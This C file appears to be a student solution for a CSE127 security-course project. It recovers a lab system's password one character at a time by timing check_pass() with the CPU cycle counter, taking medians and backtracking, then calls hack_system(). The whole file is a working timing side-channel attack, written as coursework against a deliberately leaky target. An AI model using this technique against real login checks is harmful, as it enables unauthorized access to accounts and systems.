/*******************************************************
 CSE127 Project
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CSE127 Password guesser using timing

 *******************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h> 
// include our "system" header
#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int cmpfunc (const void * a, const void * b) {
   return ( *(int*)a - *(int*)b );
}

#define MAX_PASSWORD_SIZE 32
#define PASSWORD_START_CHAR 33
#define PASSWORD_END_CHAR 126
#define NUM_OR_TRAIL 10

int main(int argc, char **argv) {
    char guess[33];
    int index=0;
    int guessChar;
    int tryChar;
    int trial;

    long start;
    long end;
    long delay;
    long median;
    long trialyArr[NUM_OR_TRAIL];     //store time delay for each trial of guessing one char to calc the median delay time 
    long delayArr[MAX_PASSWORD_SIZE];   //store time delay after guessing each char

    clock_t t; 
    t = clock();

    //in case backtrack does not work
    while(1){

        bzero(guess, sizeof(guess));

        for(index=0; index < MAX_PASSWORD_SIZE; index++) {

            delay = 0;   

            //for each char in pwd from left to right, guess all possible char 
            for( tryChar= PASSWORD_START_CHAR; tryChar <= PASSWORD_END_CHAR; tryChar++) {
                
                //try this char and call check_pass() to see if time delay get extended -> correct char
                guess[index] = tryChar;

                //#################################################################
                // loop the runnning to calc median time after running 50 times 
                for(trial=0; trial< NUM_OR_TRAIL; trial++){
                    
                    start = rdtsc();

                    // if guess this char correctly, check_pass() will call another delay() so that time delay is longer
                    // otherwise, check_pass() return 0 immediately
                    check_pass(guess);  // adding other func call may cause timming unstable 

                    end = rdtsc();
            
                    //save each delay to compute median delay time
                    trialyArr[trial] = end - start;
                }

                // sort the array of timming differences
                qsort(trialyArr, NUM_OR_TRAIL, sizeof(long), cmpfunc);

                median = trialyArr[NUM_OR_TRAIL/2];
                //#################################################################

                //refresh the delay and guessChar if we found a longer delay
                if (median > delay){
                    delay = median;
                    guessChar = tryChar;
                }
            }
            
            //store each time's guessing char and delay_time to predict 
            guess[index] = guessChar;
            delayArr[index] = delay;
                       
            //printf("index %d guessing %s \n",index, guess);
            //printf("delay %ld\n", delay);

            if (check_pass(guess)) {
                // t = clock() - t; 
                // double time_taken = ((double)t)/CLOCKS_PER_SEC;
                // printf("totaly takes %f\n", time_taken);
                printf("Password Found!\n");
                hack_system(guess);
            }

            //check if delay time stays the same Or even get less, if so, 
            //we can predict there is a wrong guss in previous, so backtrack by one char
            if( index > 0 && delay- delayArr[index-1] < 200 ){
                guess[index] = '\0';    // adding a null char to clear
                index = index - 2;
            }
        }    

    }   

    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
